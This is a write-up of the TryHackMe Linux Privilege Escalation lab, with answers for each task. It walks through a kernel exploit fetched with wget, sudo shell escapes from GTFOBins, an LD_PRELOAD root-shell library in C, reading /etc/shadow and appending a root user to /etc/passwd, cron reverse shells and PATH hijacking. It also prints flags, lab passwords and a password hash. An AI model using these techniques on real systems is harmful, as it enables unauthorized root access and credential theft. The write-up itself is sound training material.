---
title: "Privilege Escalation: Linux Privilege Escalation (TryHackMe)"
datePublished: Tue May 06 2025 18:23:47 GMT+0000 (Coordinated Universal Time)
cuid: cmacu8t7700010ajpaurh5lkf
slug: privilege-escalation-linux-privilege-escalation-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1746555731637/553a8ad6-d001-4bea-8dc7-3f81591a6c2b.png
tags: tryhackme, write-up, sudo, privilege-escalation, linux-privesc

---

This article will cover the [Linux Privilege Escalation](https://tryhackme.com/room/linprivesc) write-up under the Jr Penetration Tester on THM.

## Introduction

Privilege escalation is a journey. There are no silver bullets, and much depends on the specific configuration of the target system. The kernel version, installed applications, supported programming languages, other users' passwords are a few key elements that will affect your road to the root shell.

This room was designed to cover the main privilege escalation vectors and give you a better understanding of the process. This new skill will be an essential part of your arsenal whether you are participating in CTFs, taking certification exams, or working as a penetration tester.

## What is Privilege Escalation?

**What does "privilege escalation" mean?**

At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

**Why is it important?**

It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:

* Resetting passwords
    
* Bypassing access controls to compromise protected data
    
* Editing software configurations
    
* Enabling persistence
    
* Changing the privilege of existing (or new) users
    
* Execute any administrative command
    

## Enumeration

**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

\*\*Alternatively, you can access it over SSH with the low-privilege user credentials below:  
\*\*

**Username: karen**

**Password: Password1**

Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. Penetration testing engagements, unlike CTF machines, don't end once you gain access to a specific system or user privilege level. As you will see, enumeration is as important during the post-compromise phase as it is before.

### **hostname**

The `hostname` command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).

### **uname -a**

Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

### **/proc/version**

The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.

Looking at `/proc/version` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

### **/etc/issue**

Systems can also be identified by looking at the `/etc/issue` file. This file usually contains some information about the operating system but can easily be customized or changed. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.

### **ps Command**

The `ps` command is an effective way to see the running processes on a Linux system. Typing `ps` on your terminal will show processes for the current shell.

The output of the `ps` (Process Status) will show the following;

* PID: The process ID (unique to the process)
    
* TTY: Terminal type used by the user
    
* Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
    
* CMD: The command or executable running (will NOT display any command line parameter)
    

The “ps” command provides a few useful options.

* `ps -A`: View all running processes
    
* `ps axjf`: View process tree (see the tree formation until `ps axjf` is run below)
    

![](https://i.imgur.com/xsbohSd.png align="left")

* `ps aux`: The `aux` option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.
    

### **env**

The `env` command will show environmental variables.

![](https://i.imgur.com/LWdJ8Fw.png align="left")

The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

### **sudo -l**

The target system may be configured to allow users to run some (or all) commands with root privileges. The `sudo -l` command can be used to list all commands your user can run using `sudo`.

ls

One of the common commands used in Linux is probably `ls`.

While looking for potential privilege escalation vectors, please remember to always use the `ls` command with the `-la` parameter. The example below shows how the “secret.txt” file can easily be missed using the `ls` or `ls -l` commands.

![](https://i.imgur.com/2jOtOat.png align="left")

### **Id**

The `id` command will provide a general overview of the user’s privilege level and group memberships.

It is worth remembering that the `id` command can also be used to obtain the same information for another user as seen below.

![](https://i.imgur.com/YzfJliG.png align="left")

### **/etc/passwd**

Reading the `/etc/passwd` file can be an easy way to discover users on the system.

![](https://i.imgur.com/r6oYOEi.png align="left")

While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks.

![](https://i.imgur.com/cpS2U93.png align="left")

Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory.

![](https://i.imgur.com/psxE6V4.png align="left")

### **history**

Looking at earlier commands with the `history` command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

### **ifconfig**

The target system may be a pivoting point to another network. The `ifconfig` command will give us information about the network interfaces of the system. The example below shows the target system has three interfaces (eth0, tun0, and tun1). Our attacking machine can reach the eth0 interface but can not directly access the two other networks.

![](https://i.imgur.com/hcdZnwK.png align="left")

This can be confirmed using the `ip route` command to see which network routes exist.

![](https://i.imgur.com/PSrmz5O.png align="left")

### **netstat**

Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The `netstat` command can be used with several different options to gather information on existing connections.

* `netstat -a`: shows all listening ports and established connections.
    
* `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
    
* `netstat -l`: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
    

![](https://i.imgur.com/BbLdyrr.png align="left")

* `netstat -s`: list network usage statistics by protocol (below) This can also be used with the `-t` or `-u` options to limit the output to a specific protocol.
    

![](https://i.imgur.com/mc8OWP0.png align="left")

* `netstat -tp`: list connections with the service name and PID information.
    

![](https://i.imgur.com/fDYQwbW.png align="left")

This can also be used with the `-l` option to list listening ports (below)

![](https://i.imgur.com/JK7DNv0.png align="left")

We can see the “PID/Program name” column is empty as this process is owned by another user.

Below is the same command run with root privileges and reveals this information as 2641/nc (netcat)

![](https://i.imgur.com/FjZHqlY.png align="left")

* `netstat -i`: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.
    

![](https://i.imgur.com/r6IjpmZ.png align="left")

The `netstat` usage you will probably see most often in blog posts, write-ups, and courses is `netstat -ano` which could be broken down as follows;

* `-a`: Display all sockets
    
* `-n`: Do not resolve names
    
* `-o`: Display timers
    

![](https://i.imgur.com/UxzLBRw.png align="left")

### **find Command**

Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.

Below are some useful examples for the “find” command.

**Find files:**

* `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
    
* `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
    
* `find / -type d -name config`: find the directory named config under “/”
    
* `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
    
* `find / -perm a=x`: find executable files
    
* `find /home -user frank`: find all files for user “frank” under “/home”
    
* `find / -mtime 10`: find files that were modified in the last 10 days
    
* `find / -atime 10`: find files that were accessed in the last 10 day
    
* `find / -cmin -60`: find files changed within the last hour (60 minutes)
    
* `find / -amin -60`: find files accesses within the last hour (60 minutes)
    
* `find / -size 50M`: find files with a 50 MB size
    

This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.

![](https://i.imgur.com/pSMfoz4.png align="left")

The example above returns files that are larger than 100 MB. It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “-type f 2&gt;/dev/null” to redirect errors to “/dev/null” and have a cleaner output (below).

![](https://i.imgur.com/UKYSdE3.png align="left")

Folders and files that can be written to or executed from:

* `find / -writable -type d 2>/dev/null` : Find world-writeable folders
    
* `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
    
* `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders
    

The reason we see three different “find” commands that could potentially lead to the same result can be seen in the manual document. As you can see below, the perm parameter affects the way “find” works.

![](https://i.imgur.com/qb0klHH.png align="left")

* `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders
    

Find development tools and supported languages:

* `find / -name perl*`
    
* `find / -name python*`
    
* `find / -name gcc*`
    

Find specific file permissions:

Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path,we will see in more details on task 6. The example below is given to complete the subject on the “find” command.

* `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
    

### **General Linux Commands**

As we are in the Linux realm, familiarity with Linux commands, in general, will be very useful. Please spend some time getting comfortable with commands such as `find`, `locate`, `grep`, `cut`, `sort`, etc.

### Answer the questions below

1. What is the hostname of the target system? `wade7363`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745202194630/e1884f0b-b91f-47c3-bd56-a4cd4bc0d60e.png align="center")
    
2. What is the Linux kernel version of the target system? `3.13.0-24-generic`
    
3. What Linux is this? `Ubuntu 14.04 LTS`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745202253452/6c110572-199f-438a-b44c-8ebddfa49d32.png align="center")
    
4. What version of the Python language is installed on the system? `2.7.6`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745202304884/4dcbd2cd-70a5-484a-b890-9e2c39cacf11.png align="center")
    
5. What vulnerability seem to affect the kernel of the target system? (Enter a CVE number) `CVE-2015-1328`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745202355232/f274dfdd-7c08-46e0-bf26-79d02bef05f6.png align="center")
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745202421493/c00ab153-5d07-46aa-8fe0-1031a3b49afa.png align="center")

## Automated Enumeration Tools

Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.

The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

* **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
    
* **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
    
* **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
    
* **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
    
* **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)
    

### Answer the questions below

Install and try a few automated enumeration tools on your local Linux distribution

## Privilege Escalation: Kernel Exploits

**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

\*\*Alternatively, you can access it over SSH with the low-privilege user credentials below:  
\*\*

**Username: karen**

**Password: Password1**

Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.

Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.

The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.

The Kernel exploit methodology is simple;

1. Identify the kernel version
    
2. Search and find an exploit code for the kernel version of the target system
    
3. Run the exploit
    

Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.

**Research sources:**

1. Based on your findings, you can use Google to search for an existing exploit code.
    
2. Sources such as [https://www.cvedetails.com/](https://www.cvedetails.com/) can also be useful.
    
3. Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).
    

**Hints/Notes:**

1. Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
    
2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
    
3. Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
    
4. You can transfer the exploit code from your machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.
    

### Answer the questions below

1. find and use the appropriate kernel exploit to gain root privileges on the target system.
    
2. What is the content of the flag1.txt file? `THM-28392872729920`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745202985771/ef1c9c65-f3db-40e4-a2da-2022ff71bf02.png align="center")
    

visit the [exploitDB](https://www.exploit-db.com/exploits/37292) for Linux Kernel 3.13.0 on the browser within the attack machine and download the exploit within the root folder and move it to `/tmp` folder.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745203197438/adf52f53-912c-414b-8b6c-066cee9d0197.png align="center")

on the root user (not karen) on the terminal run `$ searchsploit linux kernel 3.13`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745203363919/48415c1a-f743-4bd2-b786-bfbb03c669b8.png align="center")

the walkthrough had suggested using wget inorder to escalate privileges, on Karen user within the terminal, `$ cd /tmp` then run `$ wget http://IP_Address:8000/ofc`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745203851000/b06096bd-1c6d-4427-a75c-7e6f303093ec.png align="center")

back to the root user on the terminal, have the exploit downloaded within the root folder then run `$ gcc 37292.c -o ofc` after which start the `$ python3 -m http.server`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745204058925/25be3d9b-a6d2-44b3-b0df-bd87e13938ed.png align="center")

you’ll be able to see exploit.c and ofc on the tmp folder and also can check the privileges. Execute the ofc by running `$ chomd +x ofc` then run `$ ./ofc`. The privileges will be esclated you check the `$ id` and you can now find the flag within the `/home/matt` folder

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745204085843/dbc9dcbd-b5c8-464e-aa48-0773d1212c30.png align="center")

## Privilege Escalation: Sudo

**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

\*\*Alternatively, you can access it over SSH with the low-privilege user credentials below:  
\*\*

**Username: karen**

**Password: Password1**

The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.

Any user can check its current situation related to root privileges using the `sudo -l` command.

[https://gtfobins.github.io/](https://gtfobins.github.io/) is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

**Leverage application functions**

Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (`-f` : specify an alternate ServerConfigFile).

![](https://i.imgur.com/rNpbbL8.png align="left")

Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file.

**Leverage LD\_PRELOAD**

On some systems, you may see the LD\_PRELOAD environment option.

![](https://i.imgur.com/gGstS69.png align="left")

LD\_PRELOAD is a function that allows any program to use shared libraries. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD\_PRELOAD. If the "env\_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD\_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;

1. Check for LD\_PRELOAD (with the env\_keep option)
    
2. Write a simple C code compiled as a share object (.so extension) file
    
3. Run the program with sudo rights and the LD\_PRELOAD option pointing to our .so file
    

The C code will simply spawn a root shell and can be written as follows;

#include &lt;stdio.h&gt;  
#include &lt;sys/types.h&gt;  
#include &lt;stdlib.h&gt;

void *init() {  
unsetenv("LD*PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

![](https://i.imgur.com/HxbszMW.png align="left")

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD\_PRELOAD option, as follows;

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

This will result in a shell spawn with root privileges.

![](https://i.imgur.com/1YwARyZ.png align="left")

### Answer the questions below

1. How many programs can the user "karen" run on the target system with sudo rights? `3`
    
    run `$ sudo -l`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745204690623/c0152703-48af-4486-891c-536965df8738.png align="center")
    
2. What is the content of the flag2.txt file? `THM-402028394`  
    
    with the help of [gtfobins](https://gtfobins.github.io/gtfobins/nano/), we’ll open nano on our terminal then `Ctrl+R` then `Ctrl+X`, you’ll this command `reset; sh 1>&0 2>&0`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745205571688/244eba32-0203-4455-b9dc-ddc2fc8a086c.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745204772720/f9a26234-6f7a-44b6-91f3-19969c0022e6.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745207844000/049b4f4d-8b14-4e39-8438-65d79af0d4e4.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745207898166/24ab1f8c-2574-402a-960f-579d386f2358.png align="center")
    
3. How would you use Nmap to spawn a root shell if your user had sudo rights on nmap? `sudo nmap --interactive`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745207932672/a1496d32-3a26-4ffe-875c-48663d74c16f.png align="center")
    
4. What is the hash of frank's password? `$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745207988836/77ca24e6-9907-4dcb-81ef-dc6b9f55877f.png align="center")
    

## Privilege Escalation: SUID

**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

\*\*Alternatively, you can access it over SSH with the low-privilege user credentials below:  
\*\*

**Username: karen**

**Password: Password1**

Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.

You will notice these files have an “s” bit set showing their special permission level.

`find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.

![](https://i.imgur.com/fJEeZ4m.png align="left")

A good practice would be to compare executables on this list with GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io/)). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list [https://gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid)).

The list above shows that nano has the SUID bit set. Unfortunately, GTFObins does not provide us with an easy win. Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.

![](https://i.imgur.com/rSRTn5v.png align="left")

**Note**: The attached VM has another binary with SUID other than `nano`.

The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the `/etc/shadow` file or adding our user to `/etc/passwd`.

Below are simple steps using both vectors.

reading the `/etc/shadow` file

We see that the nano text editor has the SUID bit set by running the `find / -type f -perm -04000 -ls 2>/dev/null` command.

`nano /etc/shadow` will print the contents of the `/etc/shadow` file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the `/etc/shadow` and `/etc/passwd` files.

![](https://i.imgur.com/DAWxbJD.png align="left")

The unshadow tool’s usage can be seen below;  
`unshadow passwd.txt shadow.txt > passwords.txt`

![](https://i.imgur.com/6cHBAr1.png align="left")

With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext. For a more detailed room on John the Ripper, you can visit [https://tryhackme.com/room/johntheripperbasics](https://tryhackme.com/room/johntheripperbasics).

The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:

We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.

![](https://i.imgur.com/bkOGaHY.png align="left")

We will then add this password with a username to the `/etc/passwd` file.

![](https://i.imgur.com/huGoEtj.png align="left")

Once our user is added (please note how `root:/bin/bash` was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges.

![](https://i.imgur.com/HZcWGhi.png align="left")

Now it's your turn to use the skills you were just taught to find a vulnerable binary.

### Answer the questions below

1. Which user shares the name of a great comic book writer? `gerryconway`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745346376583/f2c459d2-7f82-4fa7-b3fa-be5984b9104c.png align="center")
    
2. What is the password of user2? `Password1`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745346510177/e189b576-a7d3-465b-8dc9-2e787f76470a.png align="center")
    
3. What is the content of the flag3.txt file? `THM-3847834`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745346558576/9f34b440-39fc-431d-af08-4ed2c596093b.png align="center")
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745346789697/692418b1-0d38-4c67-a380-d7274ee1f202.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745346863212/5adf4cda-b3af-411d-b3c0-8b245d60d783.png align="center")

## Privilege Escalation: Capabilities

**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

\*\*Alternatively, you can access it over SSH with the low-privilege user credentials below:  
\*\*

**Username: karen**

**Password: Password1**

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.  
The capabilities man page provides detailed information on its usage and options.

We can use the `getcap` tool to list enabled capabilities.

![](https://i.imgur.com/Q6XYr0p.png align="left")

When run as an unprivileged user, `getcap -r /` will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.

Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.

![](https://i.imgur.com/6csoabB.png align="left")

GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.

We notice that vim can be used with the following command and payload:

This will launch a root shell as seen below;

![](https://i.imgur.com/jCjvgo3.png align="left")

### Answer the questions below

1. Complete the task described above on the target system
    
2. How many binaries have set capabilities? `6`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745352883201/bf92be20-833d-416b-8f4f-ecd48998b02a.png align="center")
    
3. What other binary can be used through its capabilities? `view`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745353008787/4d27d07c-f93b-46f7-8d47-90ad57864cba.png align="center")
    
4. What is the content of the flag4.txt file? `THM-9349843`
    

## Privilege Escalation: Cron Jobs

**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

\*\*Alternatively, you can access it over SSH with the low-privilege user credentials below:  
\*\*

**Username: karen**

**Password: Password1**

Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.  
The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.

Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.

Any user can read the file keeping system-wide cron jobs under `/etc/crontab`

While CTF machines can have cron jobs running every minute or every 5 minutes, you will more often see tasks that run daily, weekly or monthly in penetration test engagements.

You can see the [`backup.sh`](http://backup.sh) script was configured to run every minute. The content of the file shows a simple script that creates a backup of the prices.xls file.

![](https://i.imgur.com/qlDj93R.png align="left")

As our current user can access this script, we can easily modify it to create a reverse shell, hopefully with root privileges.

The script will use the tools available on the target system to launch a reverse shell.  
Two points to note;

1. The command syntax will vary depending on the available tools. (e.g. `nc` will probably not support the `-e` option you may have seen used in other cases)
    
2. We should always prefer to start reverse shells, as we not want to compromise the system integrity during a real penetration testing engagement.
    

The file should look like this;

![](https://i.imgur.com/579yg6H.png align="left")

We will now run a listener on our attacking machine to receive the incoming connection.

![](https://i.imgur.com/xwYXfY1.png align="left")

Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:

1. System administrators need to run a script at regular intervals.
    
2. They create a cron job to do this
    
3. After a while, the script becomes useless, and they delete it
    
4. They do not clean the relevant cron job
    

This change management issue leads to a potential exploit leveraging cron jobs.

![](https://i.imgur.com/SovymJL.png align="left")

The example above shows a similar situation where the [antivirus.sh](http://antivirus.sh) script was deleted, but the cron job still exists.  
If the full path of the script is not defined (as it was done for the [backup.sh](http://backup.sh) script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “[antivirus.sh](http://antivirus.sh)” under our user’s home folder and it should be run by the cron job.

The file on the target system should look familiar:

![](https://i.imgur.com/SHknR87.png align="left")

The incoming reverse shell connection has root privileges:

![](https://i.imgur.com/EBCue17.png align="left")

In the odd event you find an existing script or task attached to a cron job, it is always worth spending time to understand the function of the script and how any tool is used within the context. For example, tar, 7z, rsync, etc., can be exploited using their wildcard feature.

### Answer the questions below

1. How many user-defined cron jobs can you see on the target system? `4`
    
2. What is the content of the flag5.txt file? `THM-383000283`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1745891149313/264e32c0-1f8d-4084-b510-bec4e87e2bcf.png align="center")
    
3. What is Matt's password? `123456`
    

## Privilege Escalation: PATH

**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

**Alternatively, you can access it over SSH with the low-privilege user credentials below:  
**

**Username: karen**

**Password: Password1**

If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).  
  
Typically the PATH will look like this:

![](https://i.imgur.com/ch2Z4zp.png align="left")

If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm. The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.

1. What folders are located under $PATH
    
2. Does your current user have write privileges for any of these folders?
    
3. Can you modify $PATH?
    
4. Is there a script/application you can start that will be affected by this vulnerability?
    

For demo purposes, we will use the script below:

![](https://i.imgur.com/qX7m2Jq.png align="left")

This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary.

We compile this into an executable and set the SUID bit.

![](https://i.imgur.com/A6QQ65I.png align="left")

Our user now has access to the “path” script with SUID bit set.

![](https://i.imgur.com/Af1RpuY.png align="left")

Once executed “path” will look for an executable named “thm” inside folders listed under PATH.

If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege

A simple search for writable folders can done using the “`find / -writable 2>/dev/null`” command. The output of this command can be cleaned using a simple cut and sort sequence.

![](https://i.imgur.com/7UekB3t.png align="left")

Some CTF scenarios can present different folders but a regular system would output something like we see above.

Comparing this with PATH will help us find folders we could use.

![](https://i.imgur.com/67mdmmG.png align="left")

We see a number of folders under /usr, thus it could be easier to run our writable folder search once more to cover subfolders.

![](https://i.imgur.com/Y3pDsrL.png align="left")

An alternative could be the command below.

`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`

We have added “grep -v proc” to get rid of the many results related to running processes.

Unfortunately, subfolders under /usr are not writable

The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the “`export PATH=/tmp:$PATH`” command accomplishes this.

![](https://i.imgur.com/u1PM8ZD.png align="left")

At this point the path script will also look under the /tmp folder for an executable named “thm”.

Creating this command is fairly easy by copying /bin/bash as “thm” under the /tmp folder.

![](https://i.imgur.com/7UdrEnd.png align="left")

We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.

![](https://i.imgur.com/MlBJ8kb.png align="left")

### Answer the questions below

1. What is the odd folder you have write access for? `/home/murdoch`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746553260152/a1adf2fc-b668-4ea2-876e-92d84e69f29e.png align="center")
    
2. Exploit the $PATH vulnerability to read the content of the flag6.txt file.
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746553332472/0b101bf6-f5f8-489a-ac6f-26a7e76bd273.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746553400824/2defd4ba-68d8-470b-8d9e-0dd4ad4512c4.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746554336591/16355660-56e0-4bd1-8d68-f37a04cf3bdb.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746554395459/dbcf8553-1dc7-4bc4-bf8b-30d3587efc5c.png align="center")
    
